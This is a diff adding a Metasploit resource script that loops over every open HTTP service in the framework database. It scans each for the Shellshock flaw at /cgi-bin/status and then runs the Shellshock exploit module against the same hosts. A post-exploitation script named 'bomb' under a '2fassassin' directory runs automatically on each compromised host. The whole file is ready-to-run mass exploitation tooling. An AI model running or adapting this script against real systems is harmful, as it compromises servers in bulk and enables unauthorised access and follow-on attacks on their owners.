@@ -1,0 +1,35 @@
+use auxiliary/scanner/http/apache_mod_cgi_bash_env
+set VERBOSE true
+spool /root/.msf4/loot/apache_mod_cgi_bash_env
+set THREADS 1
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "http" and service.state == "open"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("set TARGETURI /cgi-bin/status")
+      self.run_single("exploit")
+      self.run_single("exit -y")
+    end
+  end
+end
+</ruby>
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set VERBOSE true
+spool /root/.msf4/loot/apache_mod_cgi_bash_env
+set THREADS 1
+set AutoRunScript multi_console_command -rc /root/2fassassin/check/vuln/shellshock/bomb
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "http" and service.state == "open"
+      self.run_single("set RHOST #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("set TARGETURI /cgi-bin/status")
+      self.run_single("exploit")
+      self.run_single("exit -y")
+    end
+  end
+end
+</ruby>
